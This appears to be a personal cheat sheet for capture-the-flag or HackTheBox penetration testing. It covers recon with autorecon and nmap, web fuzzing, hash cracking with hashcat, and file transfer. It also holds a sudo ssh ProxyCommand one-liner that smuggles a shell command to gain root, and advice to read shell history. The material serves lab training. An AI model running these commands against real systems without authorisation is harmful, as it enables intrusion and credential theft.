## For each Project / Box make a folder for Three tabs :
	
	enum
			nmap
	exploit
	
	privesec (privilege escalation)

$ sudo autorecon (ip adress)

After the autorecon it will automatically create 4 folders exploit, loot, report, and scans.

Under the scans folder you can navigate to the xml folder and it will have the full can labeled "full_tcp_nmap.txt"

Then you want to go to the scan and make a folder for each individual port 

check the showmount and make a note 

Can always use searchsploit for openssh version or whatever 

Check to make sure non of the "Low Hanging Fruit " is able such as SSH, FTP, NFS... 


Then WEB 80 / 443 /  8080

first command fuff -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u htttp://<ip>/FUZZ

view page source 





	...Useful Commands 


NMAP 
			
	$nmap -p- -T5 <ip> -v 
	$nmap -p (ports from previous scan Ex. 22,25,80 ) -A <ip> -v
	
	
Commands

	* When have a shell can switch to sudo using this command:
			$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
	
			
Cracking Hashes 

	$ hashcat -a 0 -m 1000 hash.list /usr/share/wordlists/rockyou.txt.gz 

	
	
When not able to access web server through url run in terminal 	
		
		 ( cozyhosting.htb = web server )	
	
	$ sudo sh -c 'echo "10.10.11.230 cozyhosting.htb" >> /etc/hosts'

	* was able to refresh and see the web domain			
		


SSH 

		$ ssh -i id_rsa <username>@<IP> 


	run this in shell when trying to retrieve quick files 

		$ python3 -m http.server 1234(Selected Port)

	Then navigate to URL http://<ip>:<port>/

		$ wget [http://<ip>:<port>/](http://10.10.11.227:8000/)[(intented](http://10.10.11.227:8000/(intented) file)


Continuous Downloading from web server

 		$ wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.129.202.64:1234/ytb95ytb.default-release



Once on the Linux machine or shell in general run for any clues 
		$ cat ~/.bash_history 
	
